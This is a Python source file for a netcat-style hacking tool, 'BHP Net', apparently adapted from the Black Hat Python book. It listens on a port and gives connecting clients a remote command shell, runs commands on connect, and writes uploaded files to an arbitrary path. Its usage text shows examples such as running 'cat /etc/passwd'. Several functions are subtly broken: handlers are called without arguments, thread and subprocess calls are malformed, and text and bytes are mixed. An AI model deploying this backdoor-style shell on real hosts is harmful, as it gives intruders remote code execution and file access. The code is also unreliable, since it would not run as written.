import sys
import socket
import threading
import getopt
import subprocess

class BHPNet:

    def __init__(self):
        self.listen = False
        self.command = False
        self.upload = False
        self.execute = ""
        self.target = "127.0.0.1"
        self.upload_destination = ""
        self.port = 0


    def usage(self):
        print("BHP Net Tool\n\n")
        print("Usage: bhpnet.py -t target_host -p port")
        print("-l --listen              - listen on [host]:[port] for incoming connections")
        print("-e --execute=file_to_run - execute the given file upon receiving a connection")
        print("-c --command             - initialize a command shell")
        print("-u --upload=destination  - upon receiving connection upload a file and wirto to [destination]\n\n")
        print("Examples:")
        print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
        print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
        print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
        print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
        sys.exit(0)

    def client_sender(self, buffer):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            #connect to our target host
            client.connect((self.target, self.port))
            if len(buffer):
                client.send(buffer)
            while True:
                #now wait for data back
                recv_len = 1
                response = ""

                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data

                    if recv_len < 4096:
                        break
                print (response)

                #wait for some more input
                buffer = input("")
                buffer += "\n"

                #send it off
                client.send(buffer)
        except:
            print("[*] Exception! Exiting.")

            #tear down the connection
            client.close()
    def server_loop(self):

        #if no target is defined we listen on all interfaces
        if not len(self.target):
            self.target = "0.0.0.0"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.target, self.port))
        server.listen(5)

        while True:
            client_socket, addr = server.accept()

            #spin off a thread to handle our new client
            self.target = self.client_handler()
            self.args = client_socket
            client_thread = threading.Thread(self.target, self.args)
            client_thread.start()

    def run_command(self, command):

        #trim the newline
        self.command = command.command.rstrip()

        #run the command and get the output back
        try:
            stderr = subprocess.STDOUT
            shell = True
            output = subprocess.check_output(command, stderr, shell)
        except:
            output = "Failed to execute command.\r\n"

        #send the output back to the client
        return output

    def client_handler(self, client_socket):


        #check for upload
        if len(self.upload_destination):
            #read in all of the bytes and write to our destination
            file_buffer = ""

            #keep reading data until none is available
            while True:
                data = client_socket.recv(1024)

                if not data:
                    break
                else:
                    file_buffer += data

            #now we take these bytes and try to write them out
            try:
                file_desctiptor = open(self.upload_destination, "wb")
                file_desctiptor.write(file_buffer)
                file_desctiptor.close()

                #acknowledge that we wrote the file out
                self.client_socket.send("Succesfully saved file to %s\r\n" %self.upload_destination)
            except:
                self.client_socket.send("Failed to save file to %s\r\n" %self.upload_destination)

        #check for command execution
        if len(self.execute):
            #run the command
            output = self.run_command(self.execute)
            client_socket.send(output)

        #now we go into another loop if a command shell was requested
            if self.command:
                while True:
                    #show a simple prompt
                    client_socket.send("<BHP:#> ")
                    cmd_buffer = ""

                    while "\n" not in cmd_buffer:
                        cmd_buffer += client_socket.recv(1024)

                    #send back the command output
                    response = self.run_command(cmd_buffer)

                    #send back the response
                    client_socket.send(response)


    def main(self):

        if not len(sys.argv[1:]):
            self.usage()

        #read the commandline options
        try:
            opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", ["help","listen","execute","target","port","command","upload"])
        except getopt.GetoptError as err:
            print(str(err))
            self.usage()

        for o,a in opts:
            if o in ("-h","--help"):
                self.usage()
            elif o in ("-l","--listen"):
                self.listen = True
            elif o in ("-e","--execute"):
                self.execute = a
            elif o in ("-c","-commandshell"):
                self.command = True
            elif o in ("-u","--upload"):
                self.upload_destination = a
            elif o in ("-t", "--target"):
                self.target = a
            elif o in("-p","--port"):
                self.port = int(a)
            else:
                assert False, "Unhandled Option"

        #are we going to listen or just send data from stdin?
        if not self.listen and len(self.target) and self.port > 0:
            #read in the buffer from the commandline
            #this will block, so send CTRL-D if not sending input
            #to stdin
            buffer = sys.stdin.read()

            #send data off
            self.client_sender(buffer)
        #we are going to listen and potentially
        #upload things, execute commands, and drop a shell back
        #depending on our command line options above
        if self.listen:
           self.server_loop()

if __name__ == '__main__':
    bhp = BHPNet()
    bhp.main()

